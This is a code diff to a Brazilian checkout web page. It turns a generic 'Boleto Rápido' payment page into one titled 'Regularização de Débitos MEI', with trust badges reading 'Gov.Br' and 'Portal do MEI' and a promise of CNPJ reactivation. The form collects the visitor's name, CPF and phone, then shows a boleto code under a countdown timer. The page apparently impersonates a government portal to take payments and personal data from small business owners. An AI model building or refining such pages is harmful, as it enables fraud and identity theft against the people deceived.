@@ -1650,8 +1650,8 @@
             <div class="header-left">
                 <button class="back-btn" title="Voltar"><i class="fas fa-arrow-left"></i></button>
                 <div class="brand-section">
-                    <div class="brand-logo">PAG-ONLINE</div>
-                    <div class="brand-tagline">Pagamento Seguro</div>
+                    <div class="brand-logo">QUITAÇÃO</div>
+                    <div class="brand-tagline">Regularização de Débitos MEI</div>
                 </div>
             </div>
             <div class="header-right">
@@ -1660,8 +1660,8 @@
             </div>
         </header>
         <div class="trust-banner">
-            <div class="trust-item"><i class="fas fa-lock"></i><span>100% Seguro</span></div>
-            <div class="trust-item"><i class="fas fa-check-circle"></i><span>Garantido</span></div>
+            <div class="trust-item"><i class="fas fa-lock"></i><span>Gov.Br</span></div>
+            <div class="trust-item"><i class="fas fa-check-circle"></i><span>Portal do MEI</span></div>
         </div>
         <div id="order-summary-wrapper"></div>
         <div id="cart-content-wrapper"></div>
@@ -1714,13 +1714,13 @@
         <div style="display: flex !important; flex-direction: column !important; gap: 6px !important; text-align: left !important; width: 100% !important;">
             <!-- Badge de Status -->
             <span style="display: inline-block !important; color: #0054a6 !important; font-size: 11px !important; font-weight: 700 !important; text-transform: uppercase !important; letter-spacing: 0.8px !important; margin-bottom: 2px !important;">
-                Boleto Rápido gerado
+                Boleto de Quitação Gerado
             </span>
 
             <div style="display: flex !important; align-items: center !important; justify-content: space-between !important; width: 100% !important;">
                 <!-- Nome do Vendedor -->
                 <span style="display: block !important; color: #0f172a !important; font-size: 16px !important; font-weight: 700 !important;">
-                    Aprovação Imediata!
+                    Regularização Imediata!
                 </span>
                 
                 <!-- Selo de Verificação -->
@@ -1729,7 +1729,7 @@
                         <path d="M12 1L14.31 3.52L17.61 4.15L18.04 7.52L21.1 9.27L20.13 12.55L21.1 15.83L18.04 17.58L17.61 20.95L14.31 21.58L12 24.1L9.69 21.58L6.39 20.95L5.96 17.58L2.9 15.83L3.87 12.55L2.9 9.27L5.96 7.52L6.39 4.15L9.69 3.52L12 1Z"/>
                         <path d="M9 12L11 14L15 10" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                     </svg>
-                    <span style="color: #15803d !important; font-size: 10px !important; font-weight: 700 !important; text-transform: uppercase;">Full</span>
+                    <span style="color: #15803d !important; font-size: 10px !important; font-weight: 700 !important; text-transform: uppercase;">Mei</span>
                 </div>
             </div>
 
@@ -1740,7 +1740,7 @@
                 </span>
                 <!-- Unidade Local -->
                 <span style="color: #64748b !important; font-size: 11px !important; font-weight: 500;">
-                    Desconto aplicado
+                    Débitos aplicados
                 </span>
             </div>
         </div>
@@ -1835,23 +1835,23 @@ function renderOrderSummary() {
                         <div class="payment-option-card" id="pay-now-pix">
                             <div id="pix-original-content">
                                 <div class="payment-option-icon"><i class="fas fa-bolt"></i></div>
-                                <div class="payment-option-title"><span>Boleto Rápido - Desconto</span><span class="promo-badge">Promoção</span></div>
+                                <div class="payment-option-title"><span>Quitação de Débitos - Boleto</span><span class="promo-badge">MEI</span></div>
                                 <div class="payment-option-price">R$ ${baseTotal.toFixed(2).replace('.', ',')}</div>
-                                <div class="payment-option-desc">Liberação imediata, entrega prioritária e o melhor preço garantido.</div>
+                                <div class="payment-option-desc">Quitação imediata, regularização efetivada e ativação do CNPJ.</div>
                                 <div class="pix-form-container" id="pix-form">
                                     <div class="pix-input-group"><label for="pix-name">Nome e Sobrenome</label><input type="text" id="pix-name" placeholder="Ex: João Silva" required></div>
                                     <div class="pix-input-group"><label for="pix-cpf">CPF</label><input type="tel" id="pix-cpf" placeholder="000.000.000-00" maxlength="14" inputmode="numeric" required></div>
                                     <div class="pix-input-group"><label for="pix-phone">Telefone</label><input type="tel" id="pix-phone" placeholder="(00) 00000-0000" required></div>
                                     <div class="pix-error-msg" id="pix-error-msg"><i class="fas fa-exclamation-circle"></i><span id="pix-error-text">Erro ao gerar código.</span></div>
-                                    <button class="payment-action-btn" id="btn-generate-pix" style="margin-top:10px;"><span class="btn-text">Pagar Agora R$ ${baseTotal.toFixed(2).replace('.', ',')} <i class="fas fa-check"></i></span></button>
+                                    <button class="payment-action-btn" id="btn-generate-pix" style="margin-top:10px;"><span class="btn-text">Gerar Boleto de Quitação R$ ${baseTotal.toFixed(2).replace('.', ',')} <i class="fas fa-check"></i></span></button>
                                 </div>
                             </div>
                             <div id="pix-copy-content" class="pix-copy-section">
                                 <div class="pix-header-status"><div class="pix-status-badge"><i class="fas fa-check-circle"></i> Código Gerado</div><div class="pix-timer-container"><i class="fas fa-clock"></i> Expira em: <span id="pix-timer">15:00</span></div></div>
-                                <div class="duty-info-section"><div class="duty-header"><i class="fas fa-user-shield"></i> Titular da Compra</div><div class="duty-user-data"><div class="duty-field"><span class="duty-label">Nome:</span><span class="duty-value" id="display-pix-name">---</span></div><div class="duty-field"><span class="duty-label">CPF:</span><span class="duty-value" id="display-pix-cpf">---</span></div>
+                                <div class="duty-info-section"><div class="duty-header"><i class="fas fa-user-shield"></i> Titular do CNPJ</div><div class="duty-user-data"><div class="duty-field"><span class="duty-label">Nome:</span><span class="duty-value" id="display-pix-name">---</span></div><div class="duty-field"><span class="duty-label">CPF:</span><span class="duty-value" id="display-pix-cpf">---</span></div>
 
                                     </div>
-                                    <div class="duty-warning"><i class="fas fa-info-circle"></i><span>Este Boleto é nominal e vinculado ao seu CPF.</span></div>
+                                    <div class="duty-warning"><i class="fas fa-info-circle"></i><span>Este Boleto é nominal e vinculado ao seu CPF/CNPJ.</span></div>
                                 </div>
                                 <div class="pix-code-display-wrapper"><div class="pix-code-header"><label class="pix-code-label">Código Boleto</label><span class="pix-code-value-label">R$ ${baseTotal.toFixed(2).replace('.', ',')}</span></div><div class="pix-code-input-container"><span class="pix-code-display-text" id="pix-code-text">Aguardando código...</span><button class="pix-copy-icon-btn" id="btn-copy-pix-quick" title="Copiar código"><i class="fas fa-copy"></i></button></div></div>
                                 <button class="btn-copy-pix" id="btn-copy-pix-action">Copiar código</button>
@@ -1901,7 +1901,7 @@ function renderOrderSummary() {
             btn.disabled = true;
             
             const messages = [
-                'Gerando Boleto Rápido...',
+                'Gerando Boleto de Quitação...',
                 'Aguarde...',
                 'Preparando...'
             ];
